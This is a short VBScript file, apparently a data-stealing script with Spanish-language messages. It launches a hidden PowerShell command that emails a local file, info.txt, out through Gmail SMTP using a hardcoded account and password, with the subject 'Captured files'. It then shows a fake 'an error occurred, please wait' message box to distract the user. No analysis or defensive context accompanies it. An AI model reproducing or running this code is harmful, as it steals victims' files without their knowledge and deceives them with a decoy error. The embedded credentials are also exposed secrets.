option explicit
dim shell,cmd
 
set shell=createobject("wscript.shell")
 
cmd="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -command "
 
shell.run cmd & "$Receptor = print C:\Users\%USERNAME%\Desktop\gm.txt;$EmailTo = $Receptor;$EmailFrom = 'remoteduck09@gmail.com';$Subject = 'Archivos capturados!!';$Body = 'Archivos adjuntos aqui:';$SMTPServer = 'smtp.gmail.com';$filenameAndPath = 'info.txt';$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body);$attachment = New-Object System.Net.Mail.Attachment($filenameAndPath);$SMTPMessage.Attachments.Add($attachment);$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential('remoteduck09@gmail.com', 'paralelipipedo');$SMTPClient.Send($SMTPMessage)",0
 
msgbox "Parece que a ocurrido un error, estamos corrigiendo los errores porfavor espere..."
